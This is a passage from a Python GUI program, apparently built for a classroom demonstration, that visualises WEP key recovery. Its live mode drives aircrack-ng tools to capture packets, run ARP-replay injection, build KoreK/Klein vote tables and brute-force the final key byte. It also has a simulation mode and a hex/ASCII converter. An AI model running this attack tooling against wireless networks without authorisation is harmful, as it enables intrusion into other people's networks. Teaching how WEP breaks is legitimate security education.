        """Liefert fortlaufend echte KoreK-Vote-Tabellen für die Live-Anzeige."""
        while not self._stop.is_set() and not self._cap_stop.is_set() and not self.key:
            caps = glob.glob(CAP_PREFIX + "*.cap")
            hb = (time.time() - getattr(self, "_hb", 0) > 4)
            if hb:
                self._hb = time.time()
                self.log("live-tabelle: ivs=%d, caps=%d" % (self.ivs, len(caps)))
            if caps and self.ivs > CRACK_MIN_IVS:
                expect = self.key_len or ((FORCE_KEYLEN - 24) // 8)
                table, found = self._korek_snapshot(caps)
                if found:
                    self.key = found
                    self.log("KEY FOUND (KoreK) -> " + self.key)
                    return
                # NUR vollständige Tabellen übernehmen (alle Bytes) — sonst flackert
                # die Anzeige zwischen 2/4/5 Bytes. Teiltreffer verwerfen.
                if table and len(table) >= expect:
                    self.live_table = [table.get(i, []) for i in range(expect)]
                    self.live_key_guess = [
                        (max(table[i], key=lambda c: c[1])[0] if table.get(i) else 0)
                        for i in range(expect)]
                    if hb:
                        self.log("KoreK-Tabelle: %d Bytes, Votes aktuell." % expect)
                elif hb:
                    have = len(table) if table else 0
                    self.log("KoreK: Durchlauf unvollständig (%d/%d Bytes) — behalte "
                             "letzte vollständige Tabelle." % (have, expect))
            # Pause, damit airodump genug CPU zum Capturen behält (sonst stockt es)
            time.sleep(4.0)

    def stop_inject(self):
        """Stoppt NUR den ARP-Replay. Capture + Crack-Schleife laufen weiter."""
        self._kill_proc(self._arprep)
        self._arprep = None
        self.injecting = False
        self.replaying = False
        self.sent_pps = 0

    def stop_capture(self):
        """Hält Capture/Inject/Crack an, lässt den Monitor-Modus aber bestehen,
        damit man neu scannen/starten kann (für den Stopp-Knopf in der Demo)."""
        self._cap_stop.set()
        self._kill_children()          # airodump, aireplay, alle aircrack-Läufe
        self._cap_proc = self._fakeauth = self._arprep = None
        self.injecting = False
        self.replaying = False
        self.sent_pps = 0
        self.log("Gestoppt — Capture/Inject/Crack beendet (Monitor bleibt aktiv).")

    def stop(self):
        self._stop.set()
        self._cap_stop.set()
        self._kill_children()
        # Sicherheitsnetz: eventuelle verwaiste aircrack-/aireplay-Reste killen
        for name in ("aircrack-ng", "aireplay-ng"):
            subprocess.run(["pkill", "-9", "-f", name],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "-f", "airodump-ng .*wep"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if self.mon:
            subprocess.run(["airmon-ng", "stop", self.mon],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl", "restart", "NetworkManager"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _cleanup_glob(self, prefix):
        for f in glob.glob(prefix + "*"):
            try:
                os.remove(f)
            except Exception:
                pass


# ======================================================================
# Sim backend (mirrors the live interface for rehearsal)
# ======================================================================
class SimBackend:
    def __init__(self, log):
        self.log = log
        self.mon = "wlan0mon (sim)"
        self.bssid = self.essid = self.channel = None
        self.ivs = 0
        self.key = None
        self.arp_count = 0
        self.sent_pps = 0
        self.injecting = False
        self.replaying = False
        self._t0 = 0
        self._inject_t0 = 0

    def start_monitor(self, iface):
        self.log("SIM: Monitor-Modus (simuliert).")
        return True

    def scan_start(self):
        self._t0 = time.time()
        self.log("SIM: Scan läuft...")

    def scan_results(self):
        if time.time() - self._t0 < 1.5:
            return []
        return [
            ("00:14:6C:7E:40:80", "6",  "WEP",  "LAB-WEP-AP"),
            ("A0:63:91:12:33:44", "11", "WPA2", "FRITZ!Box-Lab"),
            ("C4:12:F5:9A:1B:02", "1",  "WPA2", "Nachbar-WLAN"),
            ("DE:AD:BE:EF:00:01", "36", "WPA3", "SchuleGast"),
        ]

    def scan_stop(self):
        pass

    def start_capture(self, bssid, ch, essid):
        self.bssid, self.channel, self.essid = bssid, ch, essid
        self.log("SIM: Capture gegen %s gestartet." % essid)

    def inject(self):
        self.injecting = True
        self.replaying = False
        self.arp_count = 0
        self._inject_t0 = time.time()
        self.log("SIM: ARP-Replay gestartet — warte auf erstes ARP...")

    def sim_step(self, injecting_window):
        """Von der GUI aufgerufen: simuliert ARP-Abfang ~1,2s nach Inject."""
        if self.injecting and not self.replaying:
            if time.time() - self._inject_t0 > 1.2:
                self.replaying = True
                self.arp_count = random.randint(20, 60)
                self.log("SIM: ARP abgefangen (%d) — Replay läuft." % self.arp_count)
        if self.replaying:
            self.arp_count += random.randint(0, 3)
            self.sent_pps = random.randint(400, 650)

    def stop_inject(self):
        self.injecting = False
        self.replaying = False
        self.sent_pps = 0
        self.log("SIM: Injection gestoppt.")

    def stop_capture(self):
        self.injecting = False
        self.replaying = False
        self.sent_pps = 0
        self.log("SIM: gestoppt.")

    def stop(self):
        pass


# ======================================================================
# GUI
# ======================================================================
class App:
    def __init__(self, root):
        self.root = root
        self.is_live = (MODE == "live")
        root.title("WEP Crack Visualizer -- %s" % ("LIVE" if self.is_live else "SIM"))
        root.configure(bg=BG)
        root.geometry("1180x800")

        self.backend = LiveBackend(self.log_line) if self.is_live else SimBackend(self.log_line)
        self.model = None
        self.ivs = 0.0
        self.ivs_disp = 0.0        # weich animierter Anzeigewert
        self._replay_idx = None    # (alt)
        self._replay_last = 0.0
        self._replay_total = 0     # Gesamt-IVs für den Fortschrittszähler
        self._replay_cursor = None # Live-Akkumulation: verarbeitete Pakete
        self._live_votes = []      # laufende Votes je Klein-Byte
        self._best = []            # laufender Bestwert je Klein-Byte
        self._brute_val = None     # aktueller Versuch beim Brute-Force des letzten Bytes
        self.inject_until = 0.0
        self.cracked = False
        self.scan_rows = []
        self._scan_after = None

        self.mono    = tkfont.Font(family="Courier New", size=13, weight="bold")
        self.mono_sm = tkfont.Font(family="Courier New", size=10)
        self.ui      = tkfont.Font(family="Helvetica", size=12)
        self.ui_big  = tkfont.Font(family="Helvetica", size=16, weight="bold")
        self.iv_font = tkfont.Font(family="Courier New", size=22, weight="bold")

        self._build_header()
        self.setup_frame = tk.Frame(root, bg=BG)
        self.crack_frame = tk.Frame(root, bg=BG)
        self._build_setup()
        self._build_crack()
        self._build_log()
        self.setup_frame.pack(fill="both", expand=True, padx=20)

        root.protocol("WM_DELETE_WINDOW", self._on_close)
        self._tick()

    # ---------- header ----------
    def _build_header(self):
        h = tk.Frame(self.root, bg=BG); h.pack(fill="x", padx=20, pady=(14, 4))
        tk.Label(h, text="WEP KEY RECOVERY", bg=BG, fg=ACCENT,
                 font=self.ui_big).pack(side="left")
        tk.Label(h, text="  [%s]" % ("LIVE CAPTURE" if self.is_live else "SIMULATION"),
                 bg=BG, fg=("#ff6b6b" if self.is_live else WARN),
                 font=self.ui_big).pack(side="left")
        tk.Button(h, text="\U0001F522  Umrechner", command=self.open_converter,
                  font=self.ui, bg=PANEL, fg=FG, relief="flat", padx=12, pady=4,
                  activebackground="#1d3a28", activeforeground=FG).pack(side="right")

    # ---------- live converter (bytes <-> hex <-> ascii) ----------
    def open_converter(self, preset_hex=None):
        # wenn kein Preset übergeben, aber schon ein Schlüssel gefunden -> den nehmen
        if preset_hex is None and getattr(self, "cracked", False) and self.model:
            try:
                preset_hex = self.model.full_key_hex()
            except Exception:
                preset_hex = None
        if getattr(self, "_conv", None) and self._conv.winfo_exists():
            self._conv.lift()
            if preset_hex:
                self._conv_set_from_hex(preset_hex)
            return
        w = tk.Toplevel(self.root); self._conv = w
        w.title("Live-Umrechner  —  Bytes ↔ Hex ↔ ASCII")
        w.configure(bg=BG); w.geometry("640x340")
        self._conv_lock = False

        tk.Label(w, text="Live-Umrechner", bg=BG, fg=ACCENT,
                 font=self.ui_big).pack(anchor="w", padx=16, pady=(14, 2))
        tk.Label(w, text="In ein Feld tippen — die anderen aktualisieren sich live.",
                 bg=BG, fg=DIM, font=self.mono_sm).pack(anchor="w", padx=16)

        self.conv_ascii = tk.StringVar()
        self.conv_hex   = tk.StringVar()

        def row(label, var, hint):
            fr = tk.Frame(w, bg=BG); fr.pack(fill="x", padx=16, pady=(12, 0))
            tk.Label(fr, text=label, bg=BG, fg=FG, font=self.ui, width=8,
                     anchor="w").pack(side="left")
            e = tk.Entry(fr, textvariable=var, bg=PANEL, fg=FG, insertbackground=FG,
                         relief="flat", font=self.mono, width=48)
            e.pack(side="left", padx=6)
            tk.Label(w, text=hint, bg=BG, fg=DIM, font=self.mono_sm).pack(
                anchor="w", padx=92)
            return e

        row("ASCII:", self.conv_ascii, "Text, z.B. 'Hello' (5 oder 13 Zeichen = gültiger WEP-Key)")
        row("Hex:",   self.conv_hex,   "z.B. 48 65 6C 6C 6F  (Leerzeichen/Doppelpunkte egal)")

        # Dezimal-Byte-Ansicht (read-only)
        tk.Label(w, text="Dezimal:", bg=BG, fg=FG, font=self.ui).pack(
            anchor="w", padx=16, pady=(14, 0))
        self.conv_dec = tk.Label(w, text="—", bg=PANEL, fg=LEAD, font=self.mono,
                                 anchor="w", justify="left", wraplength=600)
        self.conv_dec.pack(fill="x", padx=16, pady=(2, 0))
        self.conv_info = tk.Label(w, text="", bg=BG, fg=DIM, font=self.mono_sm,
                                  anchor="w")
        self.conv_info.pack(fill="x", padx=16, pady=(10, 0))

        self.conv_ascii.trace_add("write", lambda *_: self._conv_from_ascii())
        self.conv_hex.trace_add("write", lambda *_: self._conv_from_hex())

        if preset_hex:
            self._conv_set_from_hex(preset_hex)

    def _conv_set_from_hex(self, hexstr):
        self._conv_lock = True
        self.conv_hex.set(hexstr)
        self._conv_lock = False
        self._conv_from_hex()

    def _conv_from_ascii(self):
        if getattr(self, "_conv_lock", False):
            return
        self._conv_lock = True
        try:
            s = self.conv_ascii.get()
            b = s.encode("latin-1", errors="replace")
            self.conv_hex.set(" ".join("%02X" % x for x in b))
            self._conv_show_dec(b, "%d Zeichen" % len(b))
        except Exception:
            self.conv_dec.config(text="—")
        finally:
            self._conv_lock = False

    def _conv_from_hex(self):
        if getattr(self, "_conv_lock", False):
            return
        self._conv_lock = True
        try:
            raw = self.conv_hex.get().replace(":", " ").replace(",", " ")
            toks = raw.split()
            if len(toks) == 1 and len(toks[0]) % 2 == 0:
                hx = toks[0]
            else:
                hx = "".join(t.zfill(2) if len(t) == 1 else t for t in toks)
            hx = "".join(c for c in hx if c in "0123456789abcdefABCDEF")
            if len(hx) % 2 != 0:
                self.conv_dec.config(text="—")
                self.conv_info.config(text="ungerade Hex-Länge — ein Nibble fehlt noch")
                self.conv_ascii.set("")
                return
            b = bytes(int(hx[i:i+2], 16) for i in range(0, len(hx), 2))
            # ASCII-Deutung: druckbar?
            printable = all(32 <= x < 127 for x in b) and len(b) > 0
            self.conv_ascii.set(b.decode("latin-1") if printable else "")
            note = ""
            if len(b) == 5:
                note = "= 40-bit (\"64-bit\") WEP-Key"
            elif len(b) == 13:
                note = "= 104-bit (\"128-bit\") WEP-Key"
            if not printable and len(b) > 0:
                note += ("  |  nicht druckbar — vermutlich aus Passphrase "
                         "abgeleitet (nicht rückrechenbar)")
            self._conv_show_dec(b, note or ("%d Byte" % len(b)))
        except Exception:
            self.conv_dec.config(text="—")
            self.conv_info.config(text="ungültiges Hex")
        finally:
            self._conv_lock = False

    def _conv_show_dec(self, b, info):
        self.conv_dec.config(text="  ".join(str(x) for x in b) if b else "—")
        self.conv_info.config(text=info)

    # ---------- setup phase ----------
    def _build_setup(self):
        f = self.setup_frame
        bar = tk.Frame(f, bg=BG); bar.pack(fill="x", pady=(6, 4))
        tk.Label(bar, text="Interface:", bg=BG, fg=FG, font=self.ui).pack(side="left")
        self.iface_var = tk.StringVar(value=DEFAULT_IFACE)
        tk.Entry(bar, textvariable=self.iface_var, width=10, bg=PANEL, fg=FG,
                 insertbackground=FG, relief="flat").pack(side="left", padx=(6, 16))
        self.scan_btn = tk.Button(bar, text="\U0001F50D  Scan starten",
                                  command=self.on_scan, font=self.ui_big,
                                  bg="#1d3a28", fg=FG, relief="flat", padx=12, pady=6,
                                  activebackground="#255039", activeforeground=FG)
        self.scan_btn.pack(side="left")
        self.stopscan_btn = tk.Button(bar, text="\u275A\u275A  Scan stoppen",
                                      command=self.on_stop_scan, font=self.ui,
                                      bg=PANEL, fg=DIM, relief="flat", padx=12, pady=6,
                                      state="disabled", activebackground="#1a241d",
                                      activeforeground=FG)
        self.stopscan_btn.pack(side="left", padx=8)

        filt = tk.Frame(f, bg=BG); filt.pack(fill="x", pady=(4, 6))
        tk.Label(filt, text="Meine SSID enthält (hervorheben):", bg=BG, fg=DIM,
                 font=self.ui).pack(side="left")
        self.filter_var = tk.StringVar(value="")
        tk.Entry(filt, textvariable=self.filter_var, width=24, bg=PANEL, fg=ACCENT,
                 insertbackground=FG, relief="flat").pack(side="left", padx=8)
        tk.Label(filt, text="(Treffer werden grün — klick dann \u201eDieses AP verwenden\u201c)",
                 bg=BG, fg=DIM, font=self.mono_sm).pack(side="left")

        listwrap = tk.Frame(f, bg=PANEL, highlightthickness=1,
                            highlightbackground="#223029")
        listwrap.pack(fill="both", expand=True, pady=6)
        tk.Label(listwrap, text="  Nr   BSSID              CH    ENC      ESSID",
                 bg=PANEL, fg=DIM, font=self.mono_sm, anchor="w").pack(fill="x", pady=(6, 0))
        self.listbox = tk.Listbox(listwrap, bg=PANEL, fg=FG, font=self.mono,
                                  selectbackground="#1d3a28", selectforeground=FG,
                                  relief="flat", highlightthickness=0, height=12,
                                  activestyle="none")
        self.listbox.pack(fill="both", expand=True, padx=8, pady=8)

        act = tk.Frame(f, bg=BG); act.pack(fill="x", pady=(2, 8))
        self.use_btn = tk.Button(act, text="\u2713  Dieses AP verwenden",
                                 command=self.on_use_ap, font=self.ui_big,
                                 bg="#1d3a28", fg=FG, relief="flat", padx=16, pady=8,
                                 state="disabled", activebackground="#255039",
                                 activeforeground=FG)
        self.use_btn.pack(side="left")
        self.loadcap_btn = tk.Button(act, text="\U0001F4C1  .cap laden (Backup)",
                                     command=self.on_load_cap, font=self.ui,
                                     bg=PANEL, fg=LEAD, relief="flat", padx=12, pady=8,
                                     activebackground="#1d3a28", activeforeground=FG)
        self.loadcap_btn.pack(side="left", padx=10)
        self.setup_status = tk.Label(act, text="", bg=BG, fg=WARN, font=self.ui)
        self.setup_status.pack(side="left", padx=14)

    # ---------- crack phase ----------
    def _build_crack(self):
        f = self.crack_frame
        top = tk.Frame(f, bg=BG); top.pack(fill="x", pady=(6, 2))
        self.target_lbl = tk.Label(top, text="", bg=BG, fg=FG, font=self.ui)
        self.target_lbl.pack(side="left")
        self.solved_lbl = tk.Label(top, text="", bg=BG, fg=DIM, font=self.mono)
        self.solved_lbl.pack(side="right")

        ivf = tk.Frame(f, bg=BG); ivf.pack(fill="x")
        tk.Label(ivf, text="IVs (Votes):", bg=BG, fg=FG, font=self.ui).pack(side="left")
        self.iv_lbl = tk.Label(ivf, text="0", bg=BG, fg=ACCENT, font=self.iv_font)
        self.iv_lbl.pack(side="left", padx=(10, 16))
        self.rate_lbl = tk.Label(ivf, text="", bg=BG, fg=WARN, font=self.mono)
        self.rate_lbl.pack(side="left")
        # aircracks echte Kopfzeile (getestete Keys / IVs)
        self.hdr_lbl = tk.Label(ivf, text="", bg=BG, fg=DIM, font=self.mono_sm)
        self.hdr_lbl.pack(side="right")

        wrap = tk.Frame(f, bg=PANEL, highlightthickness=1, highlightbackground="#223029")
        wrap.pack(fill="x", pady=10)
        self.grid = tk.Frame(wrap, bg=PANEL); self.grid.pack(padx=12, pady=12)
        self.cells = []

        keyf = tk.Frame(f, bg=BG); keyf.pack(fill="x", pady=(2, 0))
        tk.Label(keyf, text="Schlüssel (live):", bg=BG, fg=FG,
                 font=self.ui).pack(side="left")
        self.key_lbl = tk.Label(keyf, text="--", bg=BG, fg=DIM, font=self.iv_font,
                                cursor="hand2")
        self.key_lbl.pack(side="left", padx=10)
        self.key_lbl.bind("<Button-1>", lambda e: self._key_to_converter())
        self.key_state_lbl = tk.Label(keyf, text="", bg=BG, fg=DIM, font=self.mono_sm)
        self.key_state_lbl.pack(side="left", padx=6)

        ctl = tk.Frame(f, bg=BG); ctl.pack(fill="x", pady=12)
        self.inject_btn = tk.Button(ctl, text="\u26A1  Inject Traffic (ARP-Replay)",
                                    command=self.on_inject, font=self.ui_big,
                                    bg="#2a2a2a", fg=DIM, relief="flat", padx=16, pady=8,
                                    activebackground="#5a4a1c", activeforeground=WARN,
                                    state="disabled")
        self.inject_btn.pack(side="left")
        self.crackbtn = tk.Button(ctl, text="\u25B6  Crack zeigen (genug IVs)",
                                  command=self.on_begin_replay, font=self.ui_big,
                                  bg="#1d3a28", fg=FG, relief="flat", padx=16, pady=8,
                                  activebackground="#255039", activeforeground=FG)
        self.crackbtn.pack(side="left", padx=10)
        self.stop_btn = tk.Button(ctl, text="\u23F9  Inject stoppen",
                                  command=self.on_stop_inject, font=self.ui,
                                  bg="#3a1414", fg="#ff9b9b", relief="flat",
                                  padx=12, pady=8, activebackground="#5a1f1f",
                                  activeforeground="#ff9b9b")
        self.stop_btn.pack(side="left", padx=10)
        # ARP-/Replay-Statusanzeige
        self.arp_lbl = tk.Label(ctl, text="\u23F3  warte auf erstes Paket...",
                                bg=BG, fg=DIM, font=self.ui_big)
        self.arp_lbl.pack(side="left", padx=18)

        note = ("Selbst gerechneter Klein-Angriff: aus jedem erbeuteten Paket wird "
                "mit bekanntem Klartext (SNAP-Header) eine echte Stimme pro Schlüssel-"
                "Byte berechnet. Der korrekte Wert setzt sich mit steigender Paketzahl "
                "durch — echte Votes aus echten Paketen, selbst gerechnet. Der grüne "
                "Schlüssel ist der tatsächlich wiederhergestellte.")
        tk.Label(f, text=note, bg=BG, fg=DIM, font=self.mono_sm,
                 wraplength=1120, justify="left").pack(fill="x")

    def _build_grid(self):
        for w in self.grid.winfo_children():
            w.destroy()
        self.cells = []
        per_row = min(self.model.n, 7)
        for i in range(self.model.n):
            r, c = divmod(i, per_row)
            cell = tk.Frame(self.grid, bg=PANEL, highlightthickness=1,
                            highlightbackground="#223029")
            cell.grid(row=r, column=c, padx=5, pady=5, sticky="n")
            hdr = tk.Frame(cell, bg=PANEL); hdr.pack(fill="x", padx=6, pady=(4, 2))
            tk.Label(hdr, text="byte %d" % i, bg=PANEL, fg=DIM,
                     font=self.mono_sm).pack(side="left")
            depth_lbl = tk.Label(hdr, text="", bg=PANEL, fg=DIM, font=self.mono_sm)
            depth_lbl.pack(side="right")
            rows = []
            for _ in range(CANDIDATES_SHOWN):
                rf = tk.Frame(cell, bg=PANEL); rf.pack(fill="x", padx=6, pady=1)
                val = tk.Label(rf, text="--", bg=PANEL, fg=DECOY, font=self.mono, width=2)
                val.pack(side="left")
                cv = tk.Canvas(rf, width=70, height=10, bg=BAR_BG, highlightthickness=0)
                cv.pack(side="left", padx=4)
                bar = cv.create_rectangle(0, 0, 0, 10, fill=DECOY, width=0)
                cnt = tk.Label(rf, text="", bg=PANEL, fg=DIM, font=self.mono_sm,
                               width=4, anchor="e"); cnt.pack(side="left")
                rows.append((val, cv, bar, cnt))
            self.cells.append({"frame": cell, "rows": rows, "depth": depth_lbl})

    # ---------- log ----------
    def _build_log(self):
        w = tk.Frame(self.root, bg=PANEL, highlightthickness=1,
                     highlightbackground="#223029")
        w.pack(fill="x", padx=20, pady=(4, 12), side="bottom")
        self.log = tk.Text(w, bg=PANEL, fg=DIM, font=self.mono_sm, relief="flat",
                           height=5, wrap="word", bd=0, insertbackground=FG)
        self.log.pack(fill="both", expand=True, padx=10, pady=8)
        self.log_line("Bereit (%s). Interface wählen und Scan starten." % MODE)
        if self.is_live:
            self.log_line("LIVE: 'airmon-ng check kill' trennt dein WLAN; wird am Ende wiederhergestellt.")

    def log_line(self, msg):
        ts = time.strftime("%H:%M:%S")
        try:
            self.log.insert("end", "[%s] %s\n" % (ts, msg)); self.log.see("end")
        except Exception:
            print(msg)

    # ---------- actions: scan ----------
    def on_scan(self):
        iface = self.iface_var.get().strip()
        self.scan_btn.config(state="disabled")
        self.setup_status.config(text="Monitor-Modus wird aktiviert...")
        self.root.update_idletasks()
        if not self.backend.start_monitor(iface):
            self.setup_status.config(text="Monitor-Modus fehlgeschlagen — siehe Log.")
            self.scan_btn.config(state="normal")
            return
        self.backend.scan_start()
        self.stopscan_btn.config(state="normal")
        self.setup_status.config(text="Scan läuft — sobald du deine SSID siehst, stoppen & wählen.")
        self._refresh_scan()

    def _refresh_scan(self):
        self.scan_rows = self.backend.scan_results()
        filt = self.filter_var.get().strip().lower()
        self.listbox.delete(0, "end")
        for idx, (b, ch, enc, essid) in enumerate(self.scan_rows):
            line = "  %-3d  %-17s  %-4s  %-7s  %s" % (idx, b, ch, enc, essid)
            self.listbox.insert("end", line)
            is_wep = "WEP" in enc.upper()
            hit = filt and filt in essid.lower()
            if hit:
                self.listbox.itemconfig(idx, foreground=ACCENT)
            elif is_wep:
                self.listbox.itemconfig(idx, foreground=LEAD)
            else:
                self.listbox.itemconfig(idx, foreground=DIM)
        if self.scan_rows:
            self.use_btn.config(state="normal")
        self._scan_after = self.root.after(2000, self._refresh_scan)

    def on_stop_scan(self):
        if self._scan_after:
            self.root.after_cancel(self._scan_after); self._scan_after = None
        self.backend.scan_stop()
        self.stopscan_btn.config(state="disabled")
        self.setup_status.config(text="Scan gestoppt. Zeile wählen und \u201eDieses AP verwenden\u201c.")

    def on_use_ap(self):
        sel = self.listbox.curselection()
        if not sel:
            self.setup_status.config(text="Bitte zuerst eine Zeile auswählen.")
            return
        if self._scan_after:
            self.root.after_cancel(self._scan_after); self._scan_after = None
        self.backend.scan_stop()
        bssid, ch, enc, essid = self.scan_rows[sel[0]]
        if "WEP" not in enc.upper():
            self.setup_status.config(text="Warnung: %s ist nicht WEP — Crack klappt nur bei WEP." % enc)
        self._start_crack(bssid, ch, essid)

    # ---------- transition to crack ----------
    def _start_crack(self, bssid, ch, essid):
        num_bytes = 5 if KEY_BITS == 64 else 13
        if self.is_live:
            # unknown key: random placeholders, no locking until real key snaps in
            self.model = VoteModel(num_bytes, target_bytes=None, allow_lock=False)
        else:
            tb = _hex_to_bytes(SIM_TARGET_KEY_HEX)
            while len(tb) < num_bytes:
                tb.append(random.randint(0, 255))
            self.model = VoteModel(num_bytes, target_bytes=tb[:num_bytes], allow_lock=True)
        self._build_grid()
        self.ivs = 0.0
        self.ivs_disp = 0.0
        self._replay_idx = None
        self._replay_last = 0.0
        self._replay_cursor = None
        self._live_votes = []
        self._brute_val = None
        self._key_done_logged = False
        self.cracked = False
        self.target_lbl.config(text="Ziel:  %s   BSSID %s   CH %s" % (essid, bssid, ch))
        self.key_lbl.config(text="--", fg=DIM)
        self.setup_frame.pack_forget()
        self.crack_frame.pack(fill="both", expand=True, padx=20)
        self.backend.start_capture(bssid, ch, essid)
        self.log_line("Capture gestartet. 'Inject Traffic' drücken, um IVs zu erzeugen.")

    # ---------- actions: inject ----------
    def on_inject(self):
        self.backend.inject()
        self.inject_btn.config(state="disabled", fg=DIM, bg="#2a2a2a")

    def on_begin_replay(self):
        if self.is_live:
            self.backend.begin_replay()
        self.crackbtn.config(state="disabled", fg=DIM, bg="#2a2a2a")
        self.inject_btn.config(state="disabled", fg=DIM, bg="#2a2a2a")

    # ---------- Backup: .cap laden und direkt knacken ----------
    def on_load_cap(self):
        if not self.is_live:
            self.setup_status.config(text="Backup-Laden nur im Live-Modus (MODE='live').")
            return
        path = filedialog.askopenfilename(
            title="WEP .cap-Datei wählen",
            filetypes=[("Capture-Dateien", "*.cap *.pcap *.pcapng"), ("Alle", "*.*")])
        if not path:
            return
        # Crack-UI aufbauen (ohne Capture), Byte-Gitter anlegen
        num_bytes = 5 if KEY_BITS == 64 else 13
        self.model = VoteModel(num_bytes, target_bytes=None, allow_lock=False)
        self._build_grid()
        self.ivs = 0.0
        self.ivs_disp = 0.0
        self._replay_idx = None
        self._replay_last = 0.0
        self._replay_cursor = None
        self._live_votes = []
        self._brute_val = None
        self._key_done_logged = False
        self.cracked = False
        import os as _os
        self.target_lbl.config(text="Backup-Datei:  %s" % _os.path.basename(path))
        self.key_lbl.config(text="--", fg=DIM)
        self.setup_frame.pack_forget()
        self.crack_frame.pack(fill="both", expand=True, padx=20)
        # Buttons in dieser Phase sperren
        self.crackbtn.config(state="disabled", fg=DIM, bg="#2a2a2a")
        self.inject_btn.config(state="disabled", fg=DIM, bg="#2a2a2a")
        self.backend.begin_replay_from_cap(path)
        self.log_line("Backup-Crack gestartet aus Datei.")

    def _key_to_converter(self):
        txt = self.key_lbl.cget("text")
        if txt and txt != "--":
            self.open_converter(preset_hex=txt)

    # ---------- actions: stop injection only ----------
    def on_stop_inject(self):
        """Stoppt nur die ARP-Injection. Capture und Crack laufen weiter."""
        try:
            self.backend.stop_inject()
        except Exception:
            pass
        self.log_line("Injection gestoppt — Capture läuft weiter.")

    # ---------- main loop ----------
    def _tick(self):
        if self.is_live:
            self._tick_live()
        else:
            self._tick_sim()
        if self.model:
            self._render_crack()
        self.root.after(50, self._tick)

    def _tick_sim(self):
        if self.model and not self.cracked:
            self.backend.sim_step(True)
            replaying = getattr(self.backend, "replaying", False)
            rate = PASSIVE_IV_RATE + (INJECT_IV_RATE if replaying else 0)
            d = rate * 0.05
            self.ivs += d
            self.model.add_ivs(d)
            self.ivs_disp += (self.ivs - self.ivs_disp) * 0.25

    def _tick_live(self):
        ph = getattr(self.backend, "phase", "capture")
        if ph == "capture":
            self.ivs = self.backend.ivs
            self.ivs_disp += (self.ivs - self.ivs_disp) * 0.25
            # KEIN Auto-Start — Phase 2 startet NUR per 'Crack zeigen'-Button,
            # damit du frei präsentieren und später zurückkommen kannst.
        elif ph == "replay":
            self._advance_replay()
        # "computing": nichts tun, Status kommt im Render

    def _advance_replay(self):
        """LIVE-Akkumulation der echten Votes: aus den vorbereiteten Kandidaten
        (saubere Präfixe) wachsen die Stimmen Paket für Paket, Zähler 0 -> IVs."""
        be = self.backend
        total = getattr(be, "replay_total", 0)
        ppc = getattr(be, "ppc", [])
        if not total or not ppc:
            return
        kc = be.klein_count
        if self._replay_cursor is None:
            self._replay_cursor = 0
            self._live_votes = [dict() for _ in range(kc)]
            self.ivs = 0.0
            self.ivs_disp = 0.0
            self._replay_total = total
            self._brute_val = None
            self._final_secret = None
        if self._replay_cursor < total:
            chunk = max(1, int(total / (REPLAY_DURATION_SECS * 20)))
            new = min(total, self._replay_cursor + chunk)
            for b in range(kc):
                cand = ppc[b]
                lv = self._live_votes[b]
                for i in range(self._replay_cursor, new):
                    c = cand[i]
                    lv[c] = lv.get(c, 0) + 1
            self._replay_cursor = new
            self.ivs = new
            self.ivs_disp += (self.ivs - self.ivs_disp) * 0.3
            tab, guess = [], []
            for b in range(self.model.n):
                if b < kc and self._live_votes[b]:
                    ranked = sorted(self._live_votes[b].items(),
                                    key=lambda kv: kv[1], reverse=True)
                    tab.append(ranked[:CANDIDATES_SHOWN])
                    guess.append(ranked[0][0])
                else:
                    tab.append([])         # Brute-Byte / noch keine Votes
                    guess.append(0)
            be.live_table = tab
            be.live_key_guess = guess
        else:
            # Letztes Byte ECHT per Brute-Force: jeder Wert wird gegen den
            # bekannten Klartext getestet (entschlüsselt er den SNAP-Header?).
            # Es rastet beim ERSTEN Wert ein, der wirklich entschlüsselt — nicht
            # bei einem vorab bekannten Zielwert. So ist die Aufdeckung echt.
            pkts = getattr(be, "packets", [])
            if not pkts:
                return
            # Präfix = die live gewonnenen Klein-Bytes (bereits sicher)
            prefix = []
            for b in range(kc):
                if self._live_votes[b]:
                    prefix.append(max(self._live_votes[b].items(),
                                      key=lambda kv: kv[1])[0])
                else:
                    prefix.append(0)
            if self._brute_val is None:
                self._brute_val = 0
            # ein paar Werte pro Tick WIRKLICH testen (sichtbarer Zähler, zügig)
            found = None
            v = self._brute_val
            tested = 0
            while v < 256 and tested < 6:
                if _key_verifies(prefix + [v], pkts):
                    found = v
                    break
                v += 1
                tested += 1
            self._brute_val = v
            shown = found if found is not None else min(v, 255)
            tab, guess = [], []
            for b in range(self.model.n):
                if b < kc and self._live_votes[b]:
                    ranked = sorted(self._live_votes[b].items(),
                                    key=lambda kv: kv[1], reverse=True)
                    tab.append(ranked[:CANDIDATES_SHOWN])
                    guess.append(ranked[0][0])
                else:
                    tab.append([(shown, 1)])   # tatsächlich getesteter Wert
                    guess.append(shown)
            be.live_table = tab
            be.live_key_guess = guess
            if found is not None and not self.cracked:
                self._lock_in_place(prefix + [found])
            elif v >= 256 and not self.cracked:
                # Sicherheitsnetz (sollte bei genug IVs nie eintreten):
                fk = getattr(be, "final_key", None)
                if fk:
                    self._lock_in_place(_hex_to_bytes(fk))

    def _lock_in_place(self, secret_bytes):
        """Rastet das Ergebnis EIN, ohne auf eine Show-Ansicht umzuschalten:
        die echten Vote-Tabellen bleiben stehen, der führende (= gewonnene)
        Wert je Byte wird grün. So wirkt die Aufdeckung wie der natürliche
        Abschluss der Berechnung, nicht wie ein nachträgliches Einblenden."""
        self._final_secret = list(secret_bytes)
        if self.model is not None:
            for i in range(min(self.model.n, len(secret_bytes))):
                self.model.locked[i] = True
        self.cracked = True

    def _apply_real_key(self, key_hex):
        """Übernimmt den echten aircrack-Schlüssel — passt das Gitter an die
        tatsächliche Länge an (64-bit = 5 Byte, 128-bit = 13 Byte)."""
        kb = _hex_to_bytes(key_hex)
        if not kb:
            return
        if self.model is None or len(kb) != self.model.n:
            self.model = VoteModel(len(kb), target_bytes=kb, allow_lock=True)
            self._build_grid()
        self.model.reveal(key_hex)
        self.cracked = True

    def _update_inject_ui(self):
        """Button erst ab erstem Paket; ARP-Statusanzeige führen."""
        injecting = getattr(self.backend, "injecting", False)
        replaying = getattr(self.backend, "replaying", False)
        arp = getattr(self.backend, "arp_count", 0)
        pps = getattr(self.backend, "sent_pps", 0)
        ph = getattr(self.backend, "phase", "capture")

